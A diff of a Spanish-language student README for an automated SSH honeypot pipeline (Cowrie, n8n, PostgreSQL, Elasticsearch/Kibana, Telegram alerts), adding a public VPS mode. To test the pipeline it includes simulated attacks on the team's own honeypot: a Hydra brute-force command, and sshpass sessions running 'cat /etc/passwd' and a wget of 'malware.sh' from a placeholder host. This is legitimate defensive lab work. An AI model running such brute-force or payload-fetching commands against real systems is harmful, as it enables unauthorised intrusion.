@@ -3,28 +3,34 @@
 **Grupo:** Oscorp  
 **Integrantes:** López, Santiago — Morato, Elizabeth  
 **Carrera:** Tecnicatura en Programación  
-**Año:** 2026
+**Año:** 2026  
+**Tutores:** Ariel Enferrel — Alberto Cortez
 
 ---
 
 ## 📌 Descripción del Proyecto
 
-Este proyecto implementa un sistema **completamente automatizado** de monitoreo de honeypots capaz de capturar, procesar, almacenar y visualizar eventos de intrusión en tiempo real, sin intervención manual.
+Este proyecto implementa un sistema **completamente automatizado** de monitoreo de honeypots (pipeline SOAR-lite) capaz de capturar, procesar, almacenar, visualizar y alertar sobre eventos de intrusión SSH en tiempo real, sin intervención manual.
 
-El sistema utiliza el honeypot **Cowrie** para simular un servidor SSH vulnerable, **n8n** para automatizar el procesamiento de logs cada 1 minuto, **PostgreSQL** para almacenamiento estructurado, **ELK Stack** (Elasticsearch + Kibana) para análisis y visualización, y **Telegram** para alertas automáticas en tiempo real.
+El sistema utiliza el honeypot **Cowrie** para simular un servidor SSH vulnerable, **n8n** para automatizar el procesamiento de logs cada 60 segundos, **PostgreSQL** para almacenamiento estructurado, **ELK Stack** (Elasticsearch + Kibana) para análisis y visualización, y un **bot de Telegram** para alertas automáticas en tiempo real.
+
+El honeypot está desplegado en un **VPS en DigitalOcean (Amsterdam)** con IP pública real, capturando ataques reales de internet las 24 horas. El pipeline de procesamiento corre localmente y sincroniza los logs del VPS cada 55 segundos.
 
 ---
 
 ## 🏗️ Arquitectura del Sistema
 
 ```
-Atacante
-    ↓
-Honeypot Cowrie (puerto 2222)
-    ↓
-Logs JSON (cowrie.json) — escritura automática
-    ↓
-n8n (Schedule Trigger — cada 1 minuto)
+Internet (bots y atacantes reales)
+           ↓
+VPS DigitalOcean Amsterdam — IP: 167.71.8.253
+Honeypot Cowrie (puerto 2222) — activo 24/7
+           ↓
+Script sync_vps.ps1 (cada 55 seg)
+           ↓
+PC Local — cowrie_vps.json
+           ↓
+n8n (Schedule Trigger — cada 60 segundos)
     ├── PostgreSQL (almacenamiento histórico)
     ├── Elasticsearch (análisis en tiempo real)
     └── Telegram (alertas automáticas)
@@ -40,16 +46,16 @@ n8n (Schedule Trigger — cada 1 minuto)
 
 ## 🧰 Tecnologías Utilizadas
 
-| Herramienta     | Versión  | Función                              |
-|-----------------|----------|--------------------------------------|
-| Docker          | 24+      | Contenedorización del entorno        |
-| Cowrie          | 2.9+     | Honeypot SSH de media interacción    |
-| PostgreSQL      | 16       | Base de datos relacional             |
-| n8n             | 1.x      | Automatización de flujos (SOAR-lite) |
-| Elasticsearch   | 8.13.0   | Motor de búsqueda y análisis         |
-| Kibana          | 8.13.0   | Visualización de datos               |
-| Python          | 3.11+    | Scripts de análisis de logs          |
-| Telegram Bot    | API v6+  | Alertas automáticas en tiempo real   |
+| Herramienta     | Versión   | Función                               |
+|-----------------|-----------|---------------------------------------|
+| Docker          | 29+       | Contenedorización del entorno         |
+| Cowrie          | 2.9+      | Honeypot SSH de media interacción     |
+| PostgreSQL      | 15        | Base de datos relacional              |
+| n8n             | latest    | Automatización de flujos (SOAR-lite)  |
+| Elasticsearch   | 8.13.0    | Motor de búsqueda y análisis          |
+| Kibana          | 8.13.0    | Visualización de datos                |
+| Telegram Bot    | API v6+   | Alertas automáticas en tiempo real    |
+| DigitalOcean VPS| Ubuntu 24 | Exposición del honeypot a internet    |
 
 ---
 
@@ -59,8 +65,7 @@ Antes de comenzar, asegurate de tener instalado:
 
 - **Docker Desktop** — https://www.docker.com/products/docker-desktop
 - **Git** — https://git-scm.com/download/win
-- **Python 3.11+** — https://www.python.org/downloads/
-- **DBeaver Community** (opcional) — https://dbeaver.io/download/
+- **DBeaver Community** (opcional, para ver la base de datos) — https://dbeaver.io/download/
 
 **Recursos mínimos recomendados:**
 - RAM: 8 GB (se recomiendan 12 GB)
@@ -80,22 +85,30 @@ cd Proyecto-honeypots
 
 ### Paso 2 — Levantar todos los servicios
 
-Desde la carpeta `docker/` ejecutar:
-
 ```bash
-cd docker
-docker-compose up -d
+docker start friendly_kalam db-honeypot n8n elasticsearch kibana
 ```
 
-Este comando descarga automáticamente todas las imágenes y levanta los contenedores:
+Si es la primera vez y los contenedores no existen, crearlos con:
 
-| Contenedor      | Imagen                  | Puerto |
-|-----------------|-------------------------|--------|
-| friendly_kalam  | cowrie/cowrie           | 2222   |
-| db-honeypot     | postgres                | 5433   |
-| n8n             | n8nio/n8n               | 5678   |
-| elasticsearch   | elasticsearch:8.13.0    | 9200   |
-| kibana          | kibana:8.13.0           | 5601   |
+```bash
+# PostgreSQL
+docker run --name db-honeypot -e POSTGRES_USER=admin -e POSTGRES_PASSWORD=admin -e POSTGRES_DB=honeypot -p 5433:5432 -d postgres
+
+# n8n
+docker run -it --name n8n -p 5678:5678 -v "C:\Ruta\Al\Proyecto\logs":/home/node/.n8n-files/logs n8nio/n8n
+
+# Elasticsearch
+docker run -d --name elasticsearch -p 9200:9200 -e "discovery.type=single-node" -e "xpack.security.enabled=false" -e "ES_JAVA_OPTS=-Xms512m -Xmx512m" elasticsearch:8.13.0
+
+# Kibana
+docker run -d --name kibana -p 5601:5601 -e "ELASTICSEARCH_HOSTS=http://host.docker.internal:9200" kibana:8.13.0
+
+# Cowrie (honeypot local para pruebas)
+docker run -d -p 2222:2222 --name friendly_kalam -v "C:\Ruta\Al\Proyecto\logs":/cowrie/cowrie-git/var/log/cowrie cowrie/cowrie
+```
+
+> ⚠️ Reemplazar `C:\Ruta\Al\Proyecto\logs` por la ruta real de la carpeta `logs` del repositorio clonado.
 
 ### Paso 3 — Verificar que todos los contenedores estén activos
 
@@ -105,7 +118,7 @@ docker ps
 
 Deberías ver los 5 contenedores con estado `Up`.
 
-### Paso 4 — Crear la base de datos
+### Paso 4 — Crear la tabla en PostgreSQL
 
 ```bash
 docker exec -it db-honeypot psql -U admin -d honeypot -c "
@@ -122,35 +135,28 @@ CREATE TABLE IF NOT EXISTS eventos (
 );"
 ```
 
-### Paso 5 — Verificar Elasticsearch y Kibana
+### Paso 5 — Verificar los servicios
 
-- Elasticsearch: http://localhost:9200 — debe mostrar JSON con info del cluster
-- Kibana: http://localhost:5601 — debe mostrar el panel principal
+| Servicio       | URL                     | Resultado esperado              |
+|----------------|-------------------------|---------------------------------|
+| n8n            | http://localhost:5678   | Interfaz de automatización      |
+| Kibana         | http://localhost:5601   | Panel de visualización          |
+| Elasticsearch  | http://localhost:9200   | JSON con info del cluster       |
+| PostgreSQL     | localhost:5433          | Conectar desde DBeaver          |
 
 ---
 
 ## 🔧 Configuración de n8n
 
-### Acceder a n8n
-
-```
-http://localhost:5678
-```
-
-Crear una cuenta con cualquier email y contraseña (es local, no necesita ser real).
-
 ### Importar el workflow
 
-1. En n8n ir a **Workflows**
-2. Hacer clic en el menú **···**
-3. Seleccionar **Import from file**
-4. Seleccionar el archivo `scripts/workflow_honeypot.json`
+1. Abrir http://localhost:5678
+2. Ir a **Workflows → Import from file**
+3. Seleccionar el archivo `scripts/workflow_honeypot.json`
 
-### Configurar las credenciales
+### Configurar las credenciales en cada nodo
 
-El workflow necesita tres credenciales. Configurarlas dentro de n8n en cada nodo correspondiente:
-
-**PostgreSQL:**
+**Nodo PostgreSQL:**
 
 | Campo    | Valor                  |
 |----------|------------------------|
@@ -160,125 +166,199 @@ El workflow necesita tres credenciales. Configurarlas dentro de n8n en cada nodo
 | User     | admin                  |
 | Password | admin                  |
 
-**Elasticsearch:**
+**Nodo Elasticsearch:**
 
-| Campo    | Valor                           |
-|----------|---------------------------------|
+| Campo    | Valor                            |
+|----------|----------------------------------|
 | Base URL | http://host.docker.internal:9200 |
 
-**Telegram** (ver sección completa abajo):
+**Nodo Telegram:** Ver sección completa abajo.
 
-| Campo        | Valor                          |
-|--------------|--------------------------------|
-| Access Token | El token de tu bot personal    |
-| Chat ID      | Tu Chat ID personal            |
+### Activar el workflow
+
+Hacer clic en el botón **Publish** arriba a la derecha. El Schedule Trigger se activa automáticamente cada 60 segundos.
 
 ---
 
 ## 📲 Configuración de Alertas por Telegram
 
-Cada integrante debe crear su propio bot de Telegram. Las alertas llegarán al celular del operador configurado.
+> ⚠️ Cada integrante/evaluador debe crear su **propio bot personal**. No compartir tokens.
 
 ### Paso 1 — Crear el bot con BotFather
 
 1. Abrir Telegram y buscar **@BotFather**
 2. Escribir `/newbot`
-3. Ingresar un nombre para el bot, por ejemplo: `Honeypot Alertas`
-4. Ingresar un username que termine en `bot`, por ejemplo: `honeypot_oscorp_bot`
-5. BotFather devuelve un **token** con este formato:
-   ```
-   1234567890:AAHdqTcvCH1vGBJ29bqsj-VB0cMIzZk_abc
-   ```
+3. Ingresar un nombre para el bot: `Honeypot Alertas`
+4. Ingresar un username terminado en `bot`: por ejemplo `honeypot_prueba_bot`
+5. BotFather devuelve un **token** con formato: `1234567890:AAHdqTcvCH1vGBJ29bq...`
 6. Guardar ese token.
 
 ### Paso 2 — Obtener el Chat ID
 
-1. Buscar el bot en Telegram y escribirle cualquier mensaje
-2. Abrir esta URL en el navegador (reemplazar TOKEN por el token obtenido):
-   ```
-   https://api.telegram.org/botTOKEN/getUpdates
-   ```
-3. En el JSON que aparece, buscar el número en el campo `"id"` dentro de `"chat"`. Ese es el **Chat ID**.
+1. Enviar cualquier mensaje al bot recién creado
+2. Abrir en el navegador (reemplazar TOKEN):
+```
+https://api.telegram.org/botTOKEN/getUpdates
+```
+3. Buscar el número en el campo `"id"` dentro de `"chat"`. Ese es el **Chat ID**.
 
 ### Paso 3 — Configurar el nodo Telegram en n8n
 
-1. Abrir el workflow en n8n
-2. Hacer clic en el nodo **Send a text message**
-3. En **Credential** crear nueva credencial con el token propio
-4. En **Chat ID** ingresar el Chat ID propio
-5. Publicar el workflow con el botón **Publish**
-
-### Tipos de alertas que envía el sistema
-
-El sistema envía alertas automáticas solo para eventos críticos:
-
-**Login exitoso:**
-```
-🚨 ALERTA DE INTRUSIÓN 🚨
-
-Tipo: LOGIN EXITOSO
-IP Atacante: 172.18.0.1
-Usuario: root
-Contraseña: admin123
-Sesión: 8126d0746549
-Fecha: 16/4/2026
-Hora: 13:01:31
-
-🤖 Detectado automáticamente por Honeypot OSCORP
-```
-
-**Descarga de archivo malicioso:**
-```
-🚨 ALERTA DE INTRUSIÓN 🚨
-
-Tipo: DESCARGA DE ARCHIVO
-IP Atacante: 172.18.0.1
-Hash del archivo: fb91d75a6bb430787a61b0aec5...
-Sesión: 8126d0746549
-Fecha: 16/4/2026
-Hora: 13:01:53
-
-🤖 Detectado automáticamente por Honeypot OSCORP
-```
+1. En el workflow hacer clic en el nodo **Send a text message**
+2. En **Credential** crear nueva credencial con el token propio
+3. En **Chat ID** ingresar el Chat ID propio
+4. Guardar y republicar el workflow
 
 ---
 
-## ⚙️ Pipeline Automatizado
+## 🖥️ Modo 1 — Demo Local (sin VPS)
 
-A diferencia de versiones anteriores, el pipeline **no requiere ejecución manual**. El Schedule Trigger se activa automáticamente cada 1 minuto.
+Este modo permite probar el sistema completo con ataques simulados desde la propia máquina. No requiere conexión al VPS.
 
-### Flujo completo del pipeline
+### Verificar que el nodo Read File apunta al archivo local
 
+En n8n, el nodo **Read/Write Files from Disk** debe tener esta ruta:
 ```
-Schedule Trigger (cada 1 min)
-    ↓
-Read cowrie.json
-    ↓
-Code — parsear NDJSON y filtrar solo eventos nuevos
-    ↓
-Filter — dejar pasar solo eventos con eventid cowrie.*
-    ↓
-    ├── Insert rows → PostgreSQL
-    ├── Create document → Elasticsearch
-    └── Filtro Atacantes → Telegram (solo login.success y file_download)
+/home/node/.n8n-files/logs/cowrie.json
 ```
 
-### Para activar el sistema
-
-1. Importar el workflow en n8n
-2. Configurar las tres credenciales (PostgreSQL, Elasticsearch, Telegram)
-3. Hacer clic en **Publish** arriba a la derecha
-4. El sistema queda activo y procesa ataques automáticamente
-
-### Para verificar que funciona
-
-Simular un ataque:
+### Simular un ataque manual
 
 ```bash
 ssh root@localhost -p 2222
 ```
 
-Esperar 1 minuto. Debe llegar una alerta automática a Telegram.
+Ingresar cualquier contraseña y ejecutar:
+```bash
+whoami
+cat /etc/passwd
+wget http://example.com/malware.sh
+exit
+```
+
+### Verificar la detección
+
+Esperar 60 segundos. El sistema debe:
+- Insertar los eventos en PostgreSQL
+- Indexarlos en Elasticsearch
+- Mostrarlos en Kibana
+- Enviar alertas a Telegram (para login exitoso y descarga de archivo)
+
+### Simular un ataque automatizado con Hydra (desde VM Ubuntu)
+
+Si se tiene una VM Ubuntu con Hydra instalado:
+
+```bash
+# Instalar Hydra en Ubuntu
+sudo apt install hydra -y
+
+# Ejecutar ataque de fuerza bruta
+hydra -l root -P /ruta/passwords.txt ssh://IP_HOST:2222 -t 4
+```
+
+El archivo `scripts/passwords.txt` contiene un diccionario de contraseñas comunes para las pruebas.
+
+---
+### Simular un ataque automatizado con sshpass (sesiones completas con comandos)
+
+sshpass permite automatizar sesiones SSH completas simulando un atacante que ingresa al sistema y ejecuta comandos de reconocimiento y descarga de archivos. A diferencia de Hydra que solo prueba credenciales, sshpass simula el comportamiento post-explotación del atacante.
+
+**Requiere una VM Ubuntu en VirtualBox.**
+
+#### Instalar sshpass en Ubuntu
+
+```bash
+sudo apt install sshpass -y
+```
+
+#### Ejecutar una sesión completa de ataque
+
+```bash
+sshpass -p "admin" ssh -o StrictHostKeyChecking=no \
+  -o ConnectTimeout=5 -p 2222 root@IP_HOST \
+  "whoami; cat /etc/passwd; wget http://example.com/malware.sh; exit"
+```
+
+Reemplazar `IP_HOST` por la IP del sistema Windows donde corre el honeypot. Obtenerla con `ipconfig` buscando la sección Wi-Fi.
+
+#### Ejecutar el experimento completo de 40 sesiones
+
+El archivo `scripts/experimento_40.sh` automatiza 40 sesiones de ataque combinando Hydra (fuerza bruta) y sshpass (sesiones con comandos):
+
+```bash
+# Dar permisos de ejecución
+chmod +x /home/[usuario]/experimento_40.sh
+
+# Copiar el diccionario de contraseñas
+cp scripts/passwords.txt /home/[usuario]/passwords.txt
+
+# Ejecutar el experimento
+bash scripts/experimento_40.sh
+```
+
+El script genera dos fases:
+- **Fase 1:** 20 intentos de fuerza bruta con Hydra probando credenciales del diccionario
+- **Fase 2:** 20 sesiones completas con sshpass ejecutando comandos de reconocimiento y descargas
+
+Al finalizar el experimento el sistema habrá registrado más de 100 eventos en PostgreSQL y Kibana, y habrán llegado entre 15 y 25 alertas automáticas a Telegram.
+---
+
+## 🌐 Modo 2 — Con VPS (datos reales de internet)
+
+Este modo conecta el sistema local al VPS del proyecto donde el honeypot recibe ataques reales de bots de todo el mundo.
+
+> ⚠️ Este modo requiere coordinación con el grupo OSCORP para agregar la clave SSH del evaluador al servidor.
+
+### Requisito: clave SSH configurada
+
+El evaluador debe generar una clave SSH y enviarla al grupo para que sea agregada al servidor:
+
+```powershell
+# En PowerShell de Windows
+ssh-keygen -t rsa -b 4096 -f C:\Users\[USUARIO]\.ssh\id_rsa_vps
+type C:\Users\[USUARIO]\.ssh\id_rsa_vps.pub
+```
+
+El contenido del archivo `.pub` debe enviarse al grupo para ser registrado en el servidor.
+
+### Crear el script de sincronización
+
+Crear el archivo `scripts/sync_vps.ps1` con el siguiente contenido (reemplazar `[USUARIO]`):
+
+```powershell
+while ($true) {
+    scp -i C:\Users\[USUARIO]\.ssh\id_rsa_vps `
+        root@167.71.8.253:/opt/honeypot/logs/cowrie.json `
+        C:\Proyecto-honeypots\logs\cowrie_vps.json
+    Write-Host "$(Get-Date) - cowrie_vps.json sincronizado desde VPS"
+    Start-Sleep -Seconds 55
+}
+```
+
+Ejecutar en PowerShell:
+
+```powershell
+powershell -ExecutionPolicy Bypass -File C:\Proyecto-honeypots\scripts\sync_vps.ps1
+```
+
+### Actualizar el nodo Read File en n8n
+
+En el nodo **Read/Write Files from Disk** cambiar la ruta a:
+```
+/home/node/.n8n-files/logs/cowrie_vps.json
+```
+
+### Resetear el timestamp inicial (primera vez)
+
+En el nodo **Code in JavaScript** reemplazar temporalmente la línea del timestamp por:
+```javascript
+const lastTimestamp = '1970-01-01T00:00:00.000Z';
+```
+
+Publicar el workflow, esperar un ciclo, verificar que procesa eventos y restaurar la línea original:
+```javascript
+const lastTimestamp = $getWorkflowStaticData('global').lastTimestamp || '1970-01-01T00:00:00.000Z';
+```
 
 ---
 
@@ -287,8 +367,8 @@ Esperar 1 minuto. Debe llegar una alerta automática a Telegram.
 ### Configurar Data View
 
 1. Ir a http://localhost:5601
-2. Ir a **Stack Management → Data Views**
-3. Crear un Data View con estos parámetros:
+2. Ir a **Stack Management → Data Views → Create data view**
+3. Configurar:
 
 | Campo           | Valor               |
 |-----------------|---------------------|
@@ -298,12 +378,14 @@ Esperar 1 minuto. Debe llegar una alerta automática a Telegram.
 
 ### Dashboards disponibles
 
-| Panel                          | Tipo  | Descripción                              |
-|--------------------------------|-------|------------------------------------------|
-| Distribución de Comandos       | Dona  | Comandos ejecutados por atacantes        |
-| Top IPs de Origen              | Tabla | IPs que más atacaron                     |
-| Actividad Temporal de Ataques  | Barras| Ataques por día/hora                     |
-| Indicadores de Compromiso      | Tabla | Hashes SHA-256 de archivos maliciosos    |
+| Panel                         | Tipo   | Descripción                           |
+|-------------------------------|--------|---------------------------------------|
+| Distribución de Comandos      | Dona   | Comandos ejecutados por atacantes     |
+| Top IPs de Origen             | Tabla  | IPs que más atacaron                  |
+| Actividad Temporal de Ataques | Barras | Ataques por día/hora                  |
+| Indicadores de Compromiso     | Tabla  | Hashes SHA-256 de archivos maliciosos |
+
+> ⚠️ Ajustar el filtro de tiempo en Kibana para que abarque el rango de los datos disponibles.
 
 ---
 
@@ -312,17 +394,17 @@ Esperar 1 minuto. Debe llegar una alerta automática a Telegram.
 ```
 Proyecto-honeypots/
 ├── docker/
-│   └── docker-compose.yml          → Configuración de todos los contenedores
+│   └── docker-compose.yml           → Configuración de contenedores
 ├── database/
-│   └── schema.sql                  → Script SQL para crear la tabla eventos
+│   └── schema.sql                   → Script SQL para crear la tabla eventos
 ├── scripts/
-│   ├── analizar_cowrie.py          → Script Python para analizar logs
-│   └── workflow_honeypot.json      → Workflow exportado de n8n (importar en n8n)
+│   ├── workflow_honeypot.json       → Workflow de n8n (importar en n8n)
+│   ├── experimento_40.sh            → Script de ataque automatizado (Ubuntu)
+│   ├── passwords.txt                → Diccionario de contraseñas para Hydra
+│   └── sync_vps.ps1                 → Script de sincronización con VPS
 ├── logs/
-│   └── cowrie.json                 → Logs generados por Cowrie
-├── docs/
-│   └── informe.pdf                 → Documento de tesis
-└── README.md                       → Este archivo
+│   └── cowrie.json                  → Logs del honeypot local
+└── README.md                        → Este archivo
 ```
 
 ---
@@ -347,12 +429,6 @@ docker stop friendly_kalam db-honeypot n8n elasticsearch kibana
 docker ps
 ```
 
-### Ver uso de recursos
-
-```bash
-docker stats --no-stream
-```
-
 ### Limpiar logs antes de una demo
 
 ```bash
@@ -375,66 +451,52 @@ docker start friendly_kalam
 | User     | admin     |
 | Password | admin     |
 
-> **Nota:** Si aparece error de zona horaria, agregar `-Duser.timezone=UTC` al archivo `dbeaver.ini`.
-
-### Desde terminal
-
-```bash
-docker exec -it db-honeypot psql -U admin -d honeypot
-```
+> Si aparece error de zona horaria agregar `-Duser.timezone=UTC` al archivo `dbeaver.ini`.
 
 ### Consultas útiles
 
 ```sql
--- Ver todos los eventos ordenados por fecha
-SELECT * FROM eventos ORDER BY timestamp DESC;
+-- Todos los eventos del día de hoy
+SELECT * FROM eventos
+WHERE timestamp > '2026-04-21 00:00:00'
+ORDER BY timestamp DESC;
 
--- Ver solo logins exitosos
+-- Logins exitosos
 SELECT timestamp, src_ip, username, password
 FROM eventos
 WHERE username IS NOT NULL
 ORDER BY timestamp DESC;
 
--- Ver comandos ejecutados
+-- Comandos ejecutados
 SELECT timestamp, src_ip, command
 FROM eventos
 WHERE command IS NOT NULL
 ORDER BY timestamp DESC;
 
--- Contar eventos por IP atacante
+-- Conteo de eventos por IP
 SELECT src_ip, COUNT(*) as total
 FROM eventos
 GROUP BY src_ip
 ORDER BY total DESC;
 
--- Ver indicadores de compromiso (hashes)
-SELECT hash, COUNT(*) as veces_descargado
+-- Indicadores de compromiso (hashes)
+SELECT hash, COUNT(*) as descargas
 FROM eventos
 WHERE hash IS NOT NULL
 GROUP BY hash
-ORDER BY veces_descargado DESC;
+ORDER BY descargas DESC;
 ```
 
 ---
 
-## 🐍 Script de Análisis Python
-
-```bash
-cd scripts
-python analizar_cowrie.py
-```
-
-Muestra en consola los eventos clasificados por tipo.
-
----
-
-## ⚠️ Consideraciones de Seguridad
+## ⚠️ Consideraciones de Seguridad y Éticas
 
 - Este sistema está diseñado exclusivamente para uso en **entornos controlados de laboratorio**.
-- El honeypot simula un servidor vulnerable. No exponer a internet sin supervisión.
-- Las credenciales de la base de datos son de desarrollo. No usar en producción.
+- El honeypot Cowrie simula un servidor vulnerable. Toda interacción con él queda registrada con fines académicos.
+- La información recolectada (IPs, credenciales, comandos) se usa exclusivamente para el estudio de tácticas adversarias.
 - Elasticsearch tiene la seguridad desactivada (`xpack.security.enabled=false`) para facilitar el laboratorio.
-- Cada operador debe usar su propio bot de Telegram. No compartir tokens de acceso.
+- Cada operador debe usar su **propio bot de Telegram**. No compartir tokens de acceso.
+- **Está prohibido** usar este sistema para monitorear redes ajenas o atacar sistemas sin autorización explícita.
 
 ---
 
@@ -443,8 +505,10 @@ Muestra en consola los eventos clasificados por tipo.
 - Cowrie Honeypot: https://github.com/cowrie/cowrie
 - n8n Documentation: https://docs.n8n.io
 - Elasticsearch Guide: https://www.elastic.co/guide
+- Kibana Guide: https://www.elastic.co/kibana
 - PostgreSQL Documentation: https://www.postgresql.org/docs
 - Telegram Bot API: https://core.telegram.org/bots/api
+- DigitalOcean Documentation: https://docs.digitalocean.com
 
 ---
 
